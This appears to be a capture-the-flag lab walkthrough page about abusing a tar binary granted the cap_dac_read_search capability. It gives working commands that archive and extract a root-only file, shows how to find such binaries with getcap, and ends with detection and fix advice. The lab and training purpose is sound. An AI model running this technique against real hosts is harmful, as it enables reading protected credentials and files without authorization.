# C05 · Station C — cap_dac_read_search on tar · ★★★☆

> **Chapter:** [[Chapter-05-Overview]] · **Next:** [[C05-Station-D-cap_dac_override-write]]
> **Host:** `hollow-vault-01` (`target-caps`) · **Binary:** `/usr/local/bin/captar`
> **The bug:** a copy of `tar` carries `cap_dac_read_search=ep` — read any file.

This station gives you the flag **without a shell and without becoming root**.

---

## 1. Exploit — do this first

```bash
cd /tmp && mkdir loot && cd loot
captar -cf flag.tar -C / root/flag.txt    # archive a file you can't read
captar -xf flag.tar                       # extract into a dir you own
cat root/flag.txt                          # R2R{...}
```

---

## 2. How you find it

```bash
getcap -r / 2>/dev/null | grep dac_read_search
# /usr/local/bin/captar cap_dac_read_search=ep
```

## 3. Why it works

`CAP_DAC_READ_SEARCH` waives all read and directory-search permission checks.
`captar` opens `/root/flag.txt` (mode `600`) for reading — normally `EACCES`,
but the capability lets it through. The bytes land in your archive; extracting
as `labuser1` writes a copy **owned by you**, so a plain `cat` reads it.

## 4. Pitfalls

- **Docker default set** — `cap_dac_read_search` is **not** in Docker's default
  bounding set, so the lab adds it (`cap_add: [DAC_READ_SEARCH]`). Without that,
  `captar` fails to exec with `Operation not permitted`. A file capability only
  fires if the capability is also in the process bounding set — file caps and
  container caps must line up.
- You're archiving, not reading directly — extract, then read your copy.

## 5. Detect & fix

- **Detect:** `getcap -r / | grep -iE 'dac_read_search|dac_override'`; audit the container cap set (`capsh --print`, compose `cap_add`).
- **Fix:** remove the capability; keep the container bounding set minimal. [[Blue-Team-Playbook]].

## 6. What you learned

- "Read root's files" can be the whole objective — you don't always need uid 0.
- GTFOBins lists `cap_dac_read_search` for `tar`, `cp`, `rsync`.

> Next: [[C05-Station-D-cap_dac_override-write]] · Related: [[C01-Station-A-GTFOBins-find]]
